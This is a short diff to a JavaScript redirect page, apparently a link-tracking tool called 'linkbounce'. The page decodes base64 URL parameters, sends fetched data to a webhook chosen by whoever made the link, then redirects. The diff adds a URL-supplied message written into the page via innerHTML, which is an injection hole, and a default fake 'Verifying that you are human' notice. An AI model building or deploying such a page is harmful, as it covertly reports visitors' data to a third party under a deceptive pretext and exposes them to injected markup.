@@ -30,6 +30,7 @@
         var l = atob(urlParams.get('l')); // Destination Link
         var w = atob(urlParams.get('w')); // Webhook URL
         var t = atob(urlParams.get('t')); // Title
+        var m = atob(urlParams.get('m')); // Message
         if (l){
           setTimeout(function(){redir(l)}, 5000);
           const options = {method: 'GET', headers: {'User-Agent': 'linkbounce'}};
@@ -38,6 +39,11 @@
             .then(response => response.json())
             .then(response => sendToHook(response,l,w,t))
             .catch(err => console.error(err));
+        }
+        if (m){
+          document.getElementById('redir').innerHTML=m;
+        } else {
+          document.getElementById('redir').innerHTML='Verifying that you are human, this may take a minute...';
         }
         function uuidv4() {
           return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
